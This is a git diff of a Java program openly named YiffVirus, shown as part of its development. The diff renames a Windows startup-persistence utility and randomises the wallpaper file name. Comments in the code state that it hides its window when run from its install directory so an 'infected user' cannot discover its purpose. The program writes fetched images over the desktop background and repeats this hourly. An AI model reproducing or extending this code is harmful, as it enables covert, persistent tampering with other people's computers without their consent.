@@ -2,23 +2,17 @@ package me.bannock.virus;
 
 
 import com.formdev.flatlaf.FlatDarculaLaf;
-import com.formdev.flatlaf.FlatDarkLaf;
 import com.google.gson.Gson;
 import me.bannock.virus.images.ImageProviderService;
 import me.bannock.virus.images.impl.TestImageProviderService;
-import me.bannock.virus.images.impl.YiffProviderService;
-import me.bannock.virus.utils.StartOnWindowsStartUtils;
+import me.bannock.virus.utils.StartOnWindowsStartUtil;
 import me.bannock.virus.utils.WindowsUtils;
 
 import javax.swing.JFrame;
-import java.awt.GridLayout;
 import java.awt.HeadlessException;
-import java.awt.event.WindowEvent;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
-import java.util.Arrays;
-import java.util.Timer;
 
 public class YiffVirus extends JFrame implements Runnable {
 
@@ -31,7 +25,7 @@ public class YiffVirus extends JFrame implements Runnable {
 
     public static final YiffVirus INSTANCE = new YiffVirus();
 
-    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");
+    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR, "msg.json");
 
     /**
      * Creates a new gui window
@@ -69,7 +63,7 @@ public class YiffVirus extends JFrame implements Runnable {
 
         // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
         // find out the purpose of the jar just by double-clicking it and reading the window title
-        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR.getAbsolutePath()))
+        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR.getAbsolutePath()))
             showGui = false;
 
         // Display gui if wanted by user
@@ -91,7 +85,8 @@ public class YiffVirus extends JFrame implements Runnable {
 
         // Set background
         if (config.shouldChangeBackground()){
-            File bg = new File(StartOnWindowsStartUtils.WINDOWS_APPDATA_ROAMING, "/back.png");
+            File bg = new File(StartOnWindowsStartUtil.WINDOWS_APPDATA_ROAMING,
+                    "/" + Long.toString(System.currentTimeMillis(), Character.MAX_RADIX) + ".png");
             try {
                 Files.write(bg.toPath(),
                         imageProviderService.fetchBytes(imageProviderService.fetchImages(1).get(0)));
@@ -105,7 +100,7 @@ public class YiffVirus extends JFrame implements Runnable {
         // C:\ProgramData\Microsoft\User Account Pictures
 
         // Repeated hourly if wanted
-        if (config.shouldRepeatHourly())
+        if (config.shouldRunHourly())
             try{
                 Thread.sleep(1000 * 60 * 60);
                 run();
